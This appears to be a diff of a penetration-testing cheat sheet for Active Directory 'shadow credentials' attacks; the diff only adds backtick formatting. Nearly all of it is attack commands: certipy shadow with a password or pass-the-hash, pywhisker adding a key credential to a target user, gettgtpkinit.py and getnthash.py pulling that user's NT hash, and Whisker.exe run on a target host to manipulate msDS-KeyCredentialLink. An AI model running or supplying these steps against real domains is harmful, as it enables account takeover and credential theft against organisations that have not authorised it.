@@ -11,8 +11,8 @@ ____________________________________________________
  * REQUIREMENTS: Get certipy (or certipy-ad in kali) AND UPDATE IT to the last version -> https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation
 
  You can do this attack with password or NT Hash wit pass the hash technique:
- < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -p <password> -account <target user>
- < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -hashes :<your user NT hash here> -account <target user>
+` < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -p <password> -account <target user> `
+` < kerberos sync clock > ; certipy shadow auto -u <user you control>@<domain> -hashes :<your user NT hash here> -account <target user> `
 
 
 ## SHADOW CREDENTIALS ATTACK (old school method, with pywisker):
@@ -23,13 +23,13 @@ ____________________________________________________
      https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
 
 
- pywhisker -d "< domain >" -u "< user you control>" -p "< password >" --target "<target user>" --action "add"
+` pywhisker -d "< domain >" -u "< user you control>" -p "< password >" --target "<target user>" --action "add" `
 
- < kerberos sync clock > ; gettgtpkinit.py -cert-pfx <cert from previous command>.pfx -pfx-pass <pass from previous command> <domain>/<user you control> <target user>.ccache
+` < kerberos sync clock > ; gettgtpkinit.py -cert-pfx <cert from previous command>.pfx -pfx-pass <pass from previous command> <domain>/<user you control> <target user>.ccache `
 
- export KRB5CCNAME=<target user>.ccache
+` export KRB5CCNAME=<target user>.ccache `
 
- getnthash.py -key <key obtanined from previous command> <domain>/<target user>
+` getnthash.py -key <key obtanined from previous command> <domain>/<target user> `
 
 
 
@@ -40,15 +40,15 @@ ______________________________________________________
 ## SHADOW CREDENTIALS ATTACK (with whisker.exe):
 
  Upload Whisker.exe to the target machine and execute:
-   ./Whisker.exe add /target:<target user>
+  ` ./Whisker.exe add /target:<target user> `
 
  This will gieve you certificate and cert. password, then you can use it outside with gettgtpkinit.py and getnthash.py as above.
 
 
  You can also list targeted users:
-   ./Whisker.exe list /target:<target user>
+  ` ./Whisker.exe list /target:<target user> `
 
  You can also remove targets from msDS-KeyCredentialLink
-   ./Whisker.exe remove /target:<target user>
+  ` ./Whisker.exe remove /target:<target user> `
 
 
